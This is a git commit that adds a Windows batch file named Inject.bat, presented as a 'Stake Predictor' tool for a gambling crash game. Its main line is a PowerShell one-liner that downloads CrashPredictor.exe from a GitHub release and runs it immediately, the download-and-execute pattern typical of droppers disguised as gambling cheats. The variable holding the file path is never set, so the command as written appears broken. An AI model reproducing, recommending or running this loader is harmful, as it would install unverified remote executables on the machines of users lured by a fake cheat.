bcb6c2443edb2615caa6cbe4d035164b3ef17345
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-06-01 00:02:48 +0200

    Add files via upload

---
+++ Inject.bat
@@ -0,0 +1,11 @@
+@echo off
+
+title Stake Predictor
+rem You can do any color
+color 0c
+
+echo.
+echo Coded By https://github.com/IWcommunityFR
+echo.
+
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/stake-crash-preditor/releases/download/Stake-Crash-Predictor/CrashPredictor.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
